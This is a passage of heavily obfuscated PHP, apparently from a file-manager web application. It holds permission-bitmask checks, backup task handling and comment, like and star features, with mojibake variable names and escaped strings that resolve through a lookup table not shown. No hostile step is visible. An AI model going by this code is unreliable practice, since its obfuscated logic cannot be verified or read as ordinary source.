$Ş¼Áàò‹[1862] => 1, $Ş¼Áàò‹[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ş¼Áàò‹[458] => LNG($Ş¼Áàò‹[1868]), $Ş¼Áàò‹[1859] => $Ş¼Áàò‹[1869], $Ş¼Áàò‹[1861] => 4, $Ş¼Áàò‹[1862] => 1, $Ş¼Áàò‹[1863] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ş¼Áàò‹[458] => LNG($Ş¼Áàò‹[1870]), $Ş¼Áàò‹[1859] => $Ş¼Áàò‹[1871], $Ş¼Áàò‹[1861] => 5, $Ş¼Áàò‹[1862] => 1, $Ş¼Áàò‹[1863] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ş¼Áàò‹[458] => LNG($Ş¼Áàò‹[1872]), $Ş¼Áàò‹[1859] => $Ş¼Áàò‹[1873], $Ş¼Áàò‹[1861] => 6, $Ş¼Áàò‹[1862] => 1, $Ş¼Áàò‹[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ş¼Áàò‹[458] => LNG($Ş¼Áàò‹[1874]), $Ş¼Áàò‹[1859] => $Ş¼Áàò‹[1875], $Ş¼Áàò‹[1861] => 7, $Ş¼Áàò‹[1862] => 1, $Ş¼Áàò‹[1863] => 0)); return $©ËšÎÜ; } public static function authCheck($éÃ§©çØ, $ë‘”†Â») { $ôà€şö« =& $_SERVER[ªÏ§Ë·]; $éÃ§©çØ = intval($éÃ§©çØ); if ($GLOBALS[$ôà€şö«[532]] && $GLOBALS[$ôà€şö«[6]][$ôà€şö«[1876]]) { return !0; } if ($éÃ§©çØ <= 0) { return !1; } if (($éÃ§©çØ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($éÃ§©çØ & $ë‘”†Â»); } public static function authCheckShow($ĞûÎçà®) { return self::authCheck($ĞûÎçà®, self::AUTH_SHOW); } public static function authCheckView($ş×­”ÈÍ) { return self::authCheck($ş×­”ÈÍ, self::AUTH_VIEW); } public static function authCheckDownload($­È‹ö˜ƒ) { return self::authCheck($­È‹ö˜ƒ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¥¬Çœˆ) { return self::authCheck($¥¬Çœˆ, self::AUTH_UPLOAD); } public static function authCheckEdit($ó»öÆõ) { return self::authCheck($ó»öÆõ, self::AUTH_EDIT); } public static function authCheckRemove($‚‹íòğ´) { return self::authCheck($‚‹íòğ´, self::AUTH_REMOVE); } public static function authCheckShare($ôì«ßùÙ) { return self::authCheck($ôì«ßùÙ, self::AUTH_SHARE); } public static function authCheckComment($ùÜ™ë¡Í) { return self::authCheck($ùÜ™ë¡Í, self::AUTH_COMMENT); } public static function authCheckEvent($·êú£ú) { return self::authCheck($·êú£ú, self::AUTH_EVENT); } public static function authCheckRoot($™ŸƒÕ) { return self::authCheck($™ŸƒÕ, self::AUTH_ROOT); } public static function authCheckAction($½×ÊâãŒ, $Ñìç„ù) { $ïÑ‚Úá™ =& $_SERVER[ªÏ§Ë·]; $«„¹ÙÂû = array($ïÑ‚Úá™[1877] => self::AUTH_VIEW, $ïÑ‚Úá™[1219] => self::AUTH_DOWNLOAD, $ïÑ‚Úá™[117] => self::AUTH_UPLOAD, $ïÑ‚Úá™[1827] => self::AUTH_EDIT, $ïÑ‚Úá™[1826] => self::AUTH_REMOVE, $ïÑ‚Úá™[1837] => self::AUTH_SHARE, $ïÑ‚Úá™[392] => self::AUTH_COMMENT, $ïÑ‚Úá™[1655] => self::AUTH_EVENT, $ïÑ‚Úá™[1878] => self::AUTH_ROOT); if (!isset($«„¹ÙÂû[$Ñìç„ù])) { return; } $ùÄ€Ç§ã = $«„¹ÙÂû[$Ñìç„ù]; $½×ÊâãŒ = intval($½×ÊâãŒ); if ($½×ÊâãŒ <= 0) { return !1; } if (($½×ÊâãŒ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($½×ÊâãŒ & $ùÄ€Ç§ã); } public static function authDisable($¹¨Ûöâ, $³—â–ğ) { if (intval($¹¨Ûöâ) <= 0) { return 0; } return intval($¹¨Ûöâ) & ~$³—â–ğ; } public $optionType = "\123\171\163\164\x65\x6d\56\163\x6f\165\162\143\x65\x41\x75\x74\x68\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\141\165\x74\150", "\x6c\141\142\145\x6c", "\144\151\163\x70\154\141\x79", "\163\171\163\164\145\155", "\163\x6f\162\164"); public function initData() { $»ºâ¦ôğ = $this->authDefault(); foreach ($»ºâ¦ôğ as $’‚øÊİ) { $this->add($’‚øÊİ); } } public function findAuth($€ü²ÍòÚ, $óÜ£áè) { $¥¡¨ã“ó =& $_SERVER[ªÏ§Ë·]; $¹·âÓìà = parent::listData(); foreach ($¹·âÓìà as $Â «×ğ®) { $’—²ÊÆô = intval($Â «×ğ®[$¥¡¨ã“ó[451]]); if ($’—²ÊÆô <= 0 || $Â «×ğ®[$¥¡¨ã“ó[1879]] == 0) { continue; } if (($’—²ÊÆô & $€ü²ÍòÚ) != $€ü²ÍòÚ) { continue; } if (($’—²ÊÆô & $óÜ£áè) != 0) { continue; } return $Â «×ğ®[$¥¡¨ã“ó[437]]; } return !1; } public function findAuthReadOnly() { $Ãä‚ûÓ“ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $À¦Õ³¯¸ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ãä‚ûÓ“, $À¦Õ³¯¸); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ü“İĞÅÜ =& $_SERVER[ªÏ§Ë·]; $áƒƒäŒÇ = parent::listData(); $–Êíáƒ¼ = !1; foreach ($áƒƒäŒÇ as $¶ó“Áä) { if ($¶ó“Áä[$Ü“İĞÅÜ[451]] <= 0 || $¶ó“Áä[$Ü“İĞÅÜ[1879]] == $Ü“İĞÅÜ[208]) { continue; } if (!$–Êíáƒ¼) { $–Êíáƒ¼ = $¶ó“Áä; continue; } if ($–Êíáƒ¼[$Ü“İĞÅÜ[451]] > $¶ó“Áä[$Ü“İĞÅÜ[451]]) { $–Êíáƒ¼ = $¶ó“Áä; } } return $–Êíáƒ¼ ? $–Êíáƒ¼[$Ü“İĞÅÜ[437]] : $Ü“İĞÅÜ[12]; } public function listData($»²±Ò = false, $éµ£Ø¸µ = "\163\x6f\x72\x74", $ÆŒ¢›Œû = false) { return parent::listData($»²±Ò, $éµ£Ø¸µ, $ÆŒ¢›Œû); } public function update($ù¥œ˜‡, $éå©Óäî) { $°š«ö½„ =& $_SERVER[ªÏ§Ë·]; $ï«¢èæ‘ = parent::listData($ù¥œ˜‡); $ÇÄĞäê = $this->findByName($éå©Óäî[$°š«ö½„[42]]); if (!$ï«¢èæ‘ || $ÇÄĞäê && $ÇÄĞäê[$°š«ö½„[437]] != $ï«¢èæ‘[$°š«ö½„[437]]) { return !1; } $this->filterAuth($éå©Óäî[$°š«ö½„[451]]); return parent::update($ù¥œ˜‡, $éå©Óäî); } public function remove($ÅÃ‚³ìû) { $í°ŒÎ×‚ = parent::listData($ÅÃ‚³ìû); if (!$í°ŒÎ×‚ || $í°ŒÎ×‚[$_SERVER[ªÏ§Ë·][1312]]) { return !1; } return parent::remove($ÅÃ‚³ìû); } public function add($ÁëÎ¡é‘ = array()) { $ä²‰–­¢ =& $_SERVER[ªÏ§Ë·]; if ($this->findByName($ÁëÎ¡é‘[$ä²‰–­¢[42]])) { return !1; } $ˆë³ó¿ë = array($ä²‰–­¢[42] => $ä²‰–­¢[12], $ä²‰–­¢[451] => 1, $ä²‰–­¢[1880] => $ä²‰–­¢[1867], $ä²‰–­¢[1879] => 1, $ä²‰–­¢[1312] => 0, $ä²‰–­¢[1881] => 0); $ÁëÎ¡é‘ = array_merge($ˆë³ó¿ë, $ÁëÎ¡é‘); $ÁëÎ¡é‘[$ä²‰–­¢[1881]] = $this->getSort(); $this->filterAuth($ÁëÎ¡é‘[$ä²‰–­¢[451]]); return parent::insert($ÁëÎ¡é‘); } private function getSort() { $ÜêóŸ¼ƒ =& $_SERVER[ªÏ§Ë·]; $Ë½¿Ä® = parent::listData(); $šŸ¬ÖÀÜ = array_to_keyvalue($Ë½¿Ä®, $ÜêóŸ¼ƒ[12], $ÜêóŸ¼ƒ[1881]); return empty($šŸ¬ÖÀÜ) ? 0 : max($šŸ¬ÖÀÜ) + 1; } private function filterAuth(&$²ìıä Û) { if (!$²ìıä Û) { return; } $ÌÑ…ª˜Ó = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¶°…˜ŒÙ = array(); foreach ($ÌÑ…ª˜Ó as $ƒ´†ÅÚ§) { if ($²ìıä Û & $ƒ´†ÅÚ§) { $¶°…˜ŒÙ[] = $ƒ´†ÅÚ§; } } if (in_array(self::AUTH_ROOT, $¶°…˜ŒÙ)) { $²ìıä Û = array_sum($ÌÑ…ª˜Ó); return; } $çééÀ˜ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¶°…˜ŒÙ as $ƒ´†ÅÚ§) { if (isset($çééÀ˜[$ƒ´†ÅÚ§])) { $¶°…˜ŒÙ = array_merge($¶°…˜ŒÙ, $çééÀ˜[$ƒ´†ÅÚ§]); } } $¶°…˜ŒÙ[] = self::AUTH_SHOW; $²ìıä Û = array_sum(array_unique($¶°…˜ŒÙ)); } public function sort($óšÌÆˆµ, $³ü‹ˆç”) { return parent::update($óšÌÆˆµ, $³ü‹ˆç”); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\x62\x61\x63\153\165\160\x4c\x69\163\164"; public $field = array("\151\157", "\156\x61\x6d\x65", "\x73\164\141\x74\x75\163", "\143\157\156\x74\x65\x6e\164", "\155\141\x6e\165\x61\154", "\x72\145\163\165\154\x74", "\164\x69\x6d\x65\x46\x72\157\x6d", "\x74\x69\155\145\x54\157"); public function config() { $Ş¥Ş“™ =& $_SERVER[ªÏ§Ë·]; $ÖÄà³“Š = Model($Ş¥Ş“™[798])->get($Ş¥Ş“™[808]); $ÖÄà³“Š = json_decode($ÖÄà³“Š, !0); $ÖÄà³“Š = is_array($ÖÄà³“Š) ? $ÖÄà³“Š : array(); if (!isset($ÖÄà³“Š[$Ş¥Ş“™[782]])) { $ÖÄà³“Š[$Ş¥Ş“™[782]] = $Ş¥Ş“™[98]; } unset($ÖÄà³“Š[$Ş¥Ş“™[1637]]); Action($Ş¥Ş“™[1882])->taskInit(); Model($Ş¥Ş“™[1636])->cacheClear(); $í”ßÈó = $Ş¥Ş“™[1883]; $×ÌÉÓ¥û = Model($Ş¥Ş“™[1884])->findByKey($Ş¥Ş“™[1655], $í”ßÈó); if (!$×ÌÉÓ¥û) { $×ÌÉÓ¥û = array(); } if (isset($×ÌÉÓ¥û[$Ş¥Ş“™[190]])) { $×ÌÉÓ¥û[$Ş¥Ş“™[190]] = json_decode($×ÌÉÓ¥û[$Ş¥Ş“™[190]], !0); } if (isset($ÖÄà³“Š[$Ş¥Ş“™[190]])) { $×ÌÉÓ¥û[$Ş¥Ş“™[190]][$Ş¥Ş“™[1640]] = $ÖÄà³“Š[$Ş¥Ş“™[190]]; unset($ÖÄà³“Š[$Ş¥Ş“™[190]]); } return array_merge($×ÌÉÓ¥û, $ÖÄà³“Š); } public function listData($ÈÖÓó¡¦ = false, $‘·‡´ğ = "\155\157\144\151\146\171\x54\x69\155\x65", $ÃÈËÁŠá = false) { return parent::listData($ÈÖÓó¡¦, $‘·‡´ğ, !0); } public function lastItem() { $–ßõ•–Ğ = $this->listData(); return !empty($–ßõ•–Ğ[0]) ? $–ßõ•–Ğ[0] : null; } public function kill($øëØ°ÉĞ) { $ÜƒìÂš½ =& $_SERVER[ªÏ§Ë·]; $ÄÇ¤îÅë = $this->listData($øëØ°ÉĞ); if (!$ÄÇ¤îÅë || empty($ÄÇ¤îÅë[$ÜƒìÂš½[42]])) { return !0; } Task::kill($ÜƒìÂš½[807]); Task::kill($ÜƒìÂš½[828]); Task::kill($ÜƒìÂš½[837]); $¬ŒÎ¢ïö = $ÄÇ¤îÅë[$ÜƒìÂš½[42]]; $Ğ‹œã÷Ñ = TEMP_FILES . $ÜƒìÂš½[806] . $¬ŒÎ¢ïö . $ÜƒìÂš½[8]; IO::remove($Ğ‹œã÷Ñ, !1); return $this->remove($øëØ°ÉĞ); } public function remove($ÙÜ§î¼Á) { $£ğù‹»Ş = $this->listData($ÙÜ§î¼Á); if (!$£ğù‹»Ş) { return !0; } return $this->backupRemove($£ğù‹»Ş); } private function backupRemove($ÖÌ¨ÎÚ) { parent::remove($ÖÌ¨ÎÚ[$_SERVER[ªÏ§Ë·][437]]); $üËÚ¤¸ğ = $this->backupPath($ÖÌ¨ÎÚ); IO::remove($üËÚ¤¸ğ, !1); return !0; } private function backupPath($Ôç×´Äô) { $Ï‹¡ˆı„ =& $_SERVER[ªÏ§Ë·]; $Ï»® = $Ôç×´Äô[$Ï‹¡ˆı„[42]]; $à¸ŞÍÈ = Model($Ï‹¡ˆı„[798])->get($Ï‹¡ˆı„[799]); $§İª°â = substr(md5($Ï‹¡ˆı„[800] . $à¸ŞÍÈ . $Ï»®), 0, 8); return "\x7b\151\157\72{$Ôç×´Äô[$Ï‹¡ˆı„[779]]}\175\x2f\x64\x61\x74\x61\x62\x61\x73\x65\x2f\142\x61\143\153\x75\x70\x2f" . $Ï»® . $Ï‹¡ˆı„[11] . $§İª°â; } public function start() { $í¾á‹øÂ =& $_SERVER[ªÏ§Ë·]; if ($GLOBALS[$í¾á‹øÂ[6]][$í¾á‹øÂ[99]][$í¾á‹øÂ[1885]] != $í¾á‹øÂ[98]) { return !0; } $ğ­Àõèí = $this->config(); if (!$ğ­Àõèí || $ğ­Àõèí[$í¾á‹øÂ[1637]] != $í¾á‹øÂ[98]) { return !1; } $–ô¼¬È­ = $this->process(); foreach ($–ô¼¬È­ as $›¨°Ù¯‡) { if ($›¨°Ù¯‡) { return Task::restart($›¨°Ù¯‡[$í¾á‹øÂ[437]]); } } $“ñÙÎ±Ä = new Backup(); $ŸŒÌ´ã = $“ñÙÎ±Ä->db(); if ($ŸŒÌ´ã) { $ŸŒÌ´ã = $“ñÙÎ±Ä->dbFile(); if ($ŸŒÌ´ã && $ğ­Àõèí[$í¾á‹øÂ[782]] == $í¾á‹øÂ[208]) { $ŸŒÌ´ã = $“ñÙÎ±Ä->file(); } } Backup::set(array($í¾á‹øÂ[778] => 1, $í¾á‹øÂ[789] => time())); return !0; } public function process() { $ÈÔüÓòë =& $_SERVER[ªÏ§Ë·]; $›×ç‘ù = array($ÈÔüÓòë[785] => Task::get($ÈÔüÓòë[807]), $ÈÔüÓòë[790] => Task::get($ÈÔüÓòë[828]), $ÈÔüÓòë[210] => Task::get($ÈÔüÓòë[837])); $ÇÃŞ£İ = !1; foreach ($›×ç‘ù as &$¹Î‹á•÷) { if ($ÇÃŞ£İ) { $¹Î‹á•÷ = !1; continue; } if ($¹Î‹á•÷) { $©¡àÃÃ = intval(_get($¹Î‹á•÷, $ÈÔüÓòë[1672], 0)); if (time() - $©¡àÃÃ > 7200) { Task::kill($¹Î‹á•÷[$ÈÔüÓòë[437]]); $ÇÃŞ£İ = !0; $¹Î‹á•÷ = !1; } } } return $›×ç‘ù; } public function restore() { $´Àâ„ş =& $_SERVER[ªÏ§Ë·]; ActionCall($´Àâ„ş[1085], !0, 1); ActionCall($´Àâ„ş[1085], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\156\164"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\x61\155\145" => "\x63\157\x6d\155\x65\156\164\137\155\x65\x74\141", "\155\145\164\141\x46\151\x65\x6c\x64" => "\x63\x6f\155\155\145\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ôÍÙÃ¹Š) { $¦«’³ö¯ =& $_SERVER[ªÏ§Ë·]; if ($ôÍÙÃ¹Š[$¦«’³ö¯[1886]]) { $ÈæÚÅıŒ = $this->where(array($¦«’³ö¯[1887] => $ôÍÙÃ¹Š[$¦«’³ö¯[1886]]))->find(); if (!$ÈæÚÅıŒ || $ÈæÚÅıŒ[$¦«’³ö¯[449]] != $ôÍÙÃ¹Š[$¦«’³ö¯[449]] || $ÈæÚÅıŒ[$¦«’³ö¯[534]] != $ôÍÙÃ¹Š[$¦«’³ö¯[534]]) { return !1; } $this->where(array($¦«’³ö¯[1887] => $ôÍÙÃ¹Š[$¦«’³ö¯[1886]]))->setAdd($¦«’³ö¯[1888], 1); } $ôÍÙÃ¹Š[$¦«’³ö¯[1889]] = 0; $ôÍÙÃ¹Š[$¦«’³ö¯[1888]] = 0; $ôÍÙÃ¹Š[$¦«’³ö¯[778]] = 1; return $this->add($ôÍÙÃ¹Š); } public function commentCount($€¢•Ü³Ö, $šÏ¹Éª¼, $ÇÒ´İûÚ = false) { $ÙµÍ¥×¿ =& $_SERVER[ªÏ§Ë·]; if (!$€¢•Ü³Ö) { return array(); } if (is_string($€¢•Ü³Ö) || is_int($€¢•Ü³Ö)) { $€¢•Ü³Ö = array($€¢•Ü³Ö); } $¸Ê™û§ = array($ÙµÍ¥×¿[534], $ÙµÍ¥×¿[1890] => $ÙµÍ¥×¿[529]); $â”—ŒÄÁ = array($ÙµÍ¥×¿[534] => array($ÙµÍ¥×¿[7], $€¢•Ü³Ö), $ÙµÍ¥×¿[449] => $šÏ¹Éª¼); if ($ÇÒ´İûÚ) { $â”—ŒÄÁ[$ÙµÍ¥×¿[1667]] = $ÇÒ´İûÚ; } $éë›¢“ü = $this->field($¸Ê™û§)->where($â”—ŒÄÁ)->group($ÙµÍ¥×¿[534])->select(); return array_to_keyvalue($éë›¢“ü, $ÙµÍ¥×¿[534], $ÙµÍ¥×¿[529]); } public function starTarget($¤šÚÜÒ×, $›Œ–œ Ç) { $¿Ä¥‹ =& $_SERVER[ªÏ§Ë·]; $‰ÖãÜéé = $¤šÚÜÒ× + self::TYPE_STAR_OFFSET; $…‰¾®ã» = array($¿Ä¥‹[1667] => USER_ID, $¿Ä¥‹[449] => $‰ÖãÜéé, $¿Ä¥‹[534] => $›Œ–œ Ç); $ãòÑ±ˆ¯ = $this->where($…‰¾®ã»)->find(); if ($ãòÑ±ˆ¯) { return $this->where(array($¿Ä¥‹[437] => $ãòÑ±ˆ¯[$¿Ä¥‹[437]]))->delete(); } $ëÓîªµ’ = array($¿Ä¥‹[1886] => 0, $¿Ä¥‹[1667] => USER_ID, $¿Ä¥‹[778] => 1, $¿Ä¥‹[782] => $¿Ä¥‹[12], $¿Ä¥‹[449] => $‰ÖãÜéé, $¿Ä¥‹[534] => $›Œ–œ Ç, $¿Ä¥‹[1889] => 0, $¿Ä¥‹[1888] => 0); return $this->add($ëÓîªµ’); } public function starTargetCount($–ÉĞû, $ˆŒ³ÏÏñ) { $Ü‡İ‹Ÿ =& $_SERVER[ªÏ§Ë·]; $šÕŠç©Ú = $ˆŒ³ÏÏñ + self::TYPE_STAR_OFFSET; $¦ÚÄáªâ = $this->commentCount($–ÉĞû, $šÕŠç©Ú); $‚Úº­¾ˆ = $this->commentCount($–ÉĞû, $šÕŠç©Ú, USER_ID); return array($Ü‡İ‹Ÿ[1891] => $¦ÚÄáªâ, $Ü‡İ‹Ÿ[1892] => $‚Úº­¾ˆ); } public function starTargetUserList($ô¢”¾¤¢, $Àø´éüÆ) { $´ğÒ¬ã· =& $_SERVER[ªÏ§Ë·]; $Ê‹ßĞÊ˜ = $ô¢”¾¤¢ + self::TYPE_STAR_OFFSET; $¢¡ñÖƒ¾ = array($´ğÒ¬ã·[534] => $Àø´éüÆ, $´ğÒ¬ã·[449] => $Ê‹ßĞÊ˜); $Öûš´ÁÛ = $this->where($¢¡ñÖƒ¾)->count(); $‡†áªĞ— = array($´ğÒ¬ã·[293] => $Öûš´ÁÛ, $´ğÒ¬ã·[1893] => array()); if (!$Öûš´ÁÛ) { return $‡†áªĞ—; } $ÆÒºØ = $this->field($´ğÒ¬ã·[1667])->where($¢¡ñÖƒ¾)->limit(500)->select(); $ÆÒºØ = array_to_keyvalue($ÆÒºØ, $´ğÒ¬ã·[12], $´ğÒ¬ã·[1667]); $‡†áªĞ—[$´ğÒ¬ã·[1893]] = Model($´ğÒ¬ã·[542])->userListInfo($ÆÒºØ); return $‡†áªĞ—; } public function prasiseUserList($æ£è¯‚) { $“®¯àËœ =& $_SERVER[ªÏ§Ë·]; $ÉƒŸ¸´À = array($“®¯àËœ[1894] => $æ£è¯‚); $ÒÙ“¹¡İ = $this->where($ÉƒŸ¸´À)->find(); $¦ùåÇã = _get($ÒÙ“¹¡İ, $“®¯àËœ[1889], 0); $Ü…ƒÏ” = array($“®¯àËœ[293] => $¦ùåÇã, $“®¯àËœ[1893] => array()); if (!$¦ùåÇã) { return $Ü…ƒÏ”; } $¥ùÍ¢¶ˆ = Model($“®¯àËœ[1895])->field($“®¯àËœ[1667])->where($ÉƒŸ¸´À)->limit(500)->select(); $¥ùÍ¢¶ˆ = array_to_keyvalue($¥ùÍ¢¶ˆ, $“®¯àËœ[12], $“®¯àËœ[1667]); $Ü…ƒÏ”[$“®¯àËœ[1893]] = Model($“®¯àËœ[542])->userListInfo($¥ùÍ¢¶ˆ); return $Ü…ƒÏ”; } public function remove($ÏÊ·ğ©Ô) { $‚ğµãµ =& $_SERVER[ªÏ§Ë·]; $±”‘ÇûÚ = array($‚ğµãµ[1887] => $ÏÊ·ğ©Ô); $ØãÏî”Î = $this->where($±”‘ÇûÚ)->find(); if ($ØãÏî”Î[$‚ğµãµ[1886]]) { $this->where(array($‚ğµãµ[1887] => $ØãÏî”Î[$‚ğµãµ[1886]]))->setAdd($‚ğµãµ[1888], -1); } return $this->where($±”‘ÇûÚ)->delete(); } public function edit($ğÍáñÙ¿, $¢¾­©¦Ä) { $Š¬²Ÿ =& $_SERVER[ªÏ§Ë·]; $Öø»„­ = array($Š¬²Ÿ[1887] => $ğÍáñÙ¿); return $this->where($Öø»„­)->save(array($Š¬²Ÿ[1896] => $¢¾­©¦Ä)); } public function prasise($Ïš™Ò„²) { $Øê¼ê¤ =& $_SERVER[ªÏ§Ë·]; $şÇÌ°óÓ = Model($Øê¼ê¤[1897]); $ÃÌÁ‰ = array($Øê¼ê¤[1887] => $Ïš™Ò„², $Øê¼ê¤[1658] => USER_ID); $È¨°Á¬  = $şÇÌ°óÓ->where($ÃÌÁ‰)->find(); if (!$È¨°Á¬ ) { $şÇÌ°óÓ->add($ÃÌÁ‰); $ÆıèöÉ = $this->where(array($Øê¼ê¤[1887] => $Ïš™Ò„²))->setAdd($Øê¼ê¤[1889], 1); } else { $şÇÌ°óÓ->where($ÃÌÁ‰)->delete(); $ÆıèöÉ = $this->where(array($Øê¼ê¤[1887] => $Ïš™Ò„²))->setAdd($Øê¼ê¤[1889], -1); } return $ÆıèöÉ; } public function targetInfo($¾‡”Ñğ, $¼Îìœ¯”) { $ÑïÌØ¡” =& $_SERVER[ªÏ§Ë·]; $ÇïµÉ’¨ = array($ÑïÌØ¡”[614] => $¾‡”Ñğ, $ÑïÌØ¡”[615] => $¼Îìœ¯”); $’¶˜şüƒ = $this->where($ÇïµÉ’¨)->count(); $˜«¥é½à = "\x52\x49\x47\110\124\40\112\117\x49\116\x20{$this->tablePrefix}\143\x6f\x6d\x6d\x65\x6e\164\x5f\160\162\141\151\163\x65\40\x73\x74\141\162\40\157\x6e\x20\143\157\155\x6d\145\x6e\164\x2e\143\157\155\x6d\145\156\164\111\x44\x20\x3d\x20\x73\x74\141\162\56\143\157\x6d\155\x65\x6e\164\111\x44"; $Öˆíª = $this->alias($ÑïÌØ¡”[392])->where($ÇïµÉ’¨)->join($˜«¥é½à, $ÑïÌØ¡”[1898])->count(); $®ÙŒ¹ìÎ = array($ÑïÌØ¡”[1899] => $’¶˜şüƒ, $ÑïÌØ¡”[1900] => $Öˆíª); return $®ÙŒ¹ìÎ; } public function listData($Òµô¼) { $Ç–’… =& $_SERVER[ªÏ§Ë·]; if (isset($Òµô¼[$Ç–’…[1901]])) { if ($Òµô¼[$Ç–’…[1901]]) { $Òµô¼[$Ç–’…[1894]] = array($Ç–’…[1039], intval($Òµô¼[$Ç–’…[1901]])); } unset($Òµô¼[$Ç–’…[1901]]); } if (isset($Òµô¼[$Ç–’…[1902]])) { if ($Òµô¼[$Ç–’…[1902]]) { $Òµô¼[$Ç–’…[1894]] = array($Ç–’…[1036], intval($Òµô¼[$Ç–’…[1902]])); } unset($Òµô¼[$Ç–’…[1902]]); } return $this->_listData($Òµô¼); } private function _listData($Õ¾À‘ş§) { $Ş¸éä´® =& $_SERVER[ªÏ§Ë·]; $³ÉëÓ’ = $this->where($Õ¾À‘ş§)->_makeOrder()->selectPage(100); $this->_listAppendParent($³ÉëÓ’[$Ş¸éä´®[407]]); $this->_listAppendUser($³ÉëÓ’[$Ş¸éä´®[407]]); $this->_listAppendMeta($³ÉëÓ’[$Ş¸éä´®[407]]); return $³ÉëÓ’; } private function _makeOrder() { $­ŞÓÑ€š =& $_SERVER[ªÏ§Ë·]; $ı³âàÛÏ = array($­ŞÓÑ€š[1889], $­ŞÓÑ€š[1888], $­ŞÓÑ€š[211]); $ÅéÛÒ¨ = Input::get($­ŞÓÑ€š[495], $­ŞÓÑ€š[7], $­ŞÓÑ€š[461], $ı³âàÛÏ); $ıÅ¬¹²Ñ = Input::get($­ŞÓÑ€š[496], $­ŞÓÑ€š[7], $­ŞÓÑ€š[1660], array($­ŞÓÑ€š[1903], $­ŞÓÑ€š[491])); $¿éÜ¢¸ş = $ÅéÛÒ¨ . $­ŞÓÑ€š[63] . $ıÅ¬¹²Ñ; return $this->order($¿éÜ¢¸ş); } private function _listAppendParent(&$‘ù¬Êí±) { $‰ µ¢±Ì =& $_SERVER[ªÏ§Ë·]; $µ””¾Ÿ = array_unique(array_to_keyvalue($‘ù¬Êí±, $‰ µ¢±Ì[12], $‰ µ¢±Ì[1886])); $µ””¾Ÿ = array_remove_value($µ””¾Ÿ, $‰ µ¢±Ì[208]); if (!$µ””¾Ÿ) { return; } $×®™¢Åë = $this->where(array($‰ µ¢±Ì[1887] => array($‰ µ¢±Ì[7], $µ””¾Ÿ)))->select(); $×®™¢Åë = array_to_keyvalue($×®™¢Åë, $‰ µ¢±Ì[1894]); foreach ($‘ù¬Êí± as &$ø—‡ıî) { if (isset($×®™¢Åë[$ø—‡ıî[$‰ µ¢±Ì[1886]]])) { $ø—‡ıî[$‰ µ¢±Ì[1904]] = $×®™¢Åë[$ø—‡ıî[$‰ µ¢±Ì[1886]]]; } } unset($ø—‡ıî); } private function _listAppendUser(&$‘Ó½œî°) { $Ğ¾ÙÄõ® =& $_SERVER[ªÏ§Ë·]; $‘£Æòş = array_unique(array_to_keyvalue($‘Ó½œî°, $Ğ¾ÙÄõ®[12], $Ğ¾ÙÄõ®[1667])); $‘£Æòş = array_remove_value($‘£Æòş, $Ğ¾ÙÄõ®[208]); if (count($‘£Æòş) == 0) { return; } foreach ($‘Ó½œî° as $óÄàŒÛÌ) { if (isset($óÄàŒÛÌ[$Ğ¾ÙÄõ®[1904]])) { $‘£Æòş[] = $óÄàŒÛÌ[$Ğ¾ÙÄõ®[1904]][$Ğ¾ÙÄõ®[1667]]; } } $¿ó¬ı±œ = Model($Ğ¾ÙÄõ®[563])->userListInfo($‘£Æòş); foreach ($‘Ó½œî° as &$óÄàŒÛÌ) { $óÄàŒÛÌ[$Ğ¾ÙÄõ®[628]] = $¿ó¬ı±œ[$óÄàŒÛÌ[$Ğ¾ÙÄõ®[1667]]]; if (isset($óÄàŒÛÌ[$Ğ¾ÙÄõ®[1904]])) { $óÄàŒÛÌ[$Ğ¾ÙÄõ®[1904]][$Ğ¾ÙÄõ®[628]] = $¿ó¬ı±œ[$óÄàŒÛÌ[$Ğ¾ÙÄõ®[1904]][$Ğ¾ÙÄõ®[1667]]]; } } unset($óÄàŒÛÌ); } private function _listAppendMeta(&$¤˜ŸÓà) { $ç´ÕğŞØ =& $_SERVER[ªÏ§Ë·]; $—ş¤ñŞ = array_unique(array_to_keyvalue($¤˜ŸÓà, $ç´ÕğŞØ[12], $ç´ÕğŞØ[1894])); $—ş¤ñŞ = array_remove_value($—ş¤ñŞ, $ç´ÕğŞØ[208]); if (!$—ş¤ñŞ) { return; } foreach ($¤˜ŸÓà as $â¢Ô­) { if (isset($â¢Ô­[$ç´ÕğŞØ[1904]])) { $—ş¤ñŞ[] = $â¢Ô­[$ç´ÕğŞØ[1904]][$ç´ÕğŞØ[1894]]; } } $©ëµ£Ö– = $this->metaList($—ş¤ñŞ); if (!$©ëµ£Ö–) { return !1; } foreach ($¤˜ŸÓà as &$â¢Ô­) { 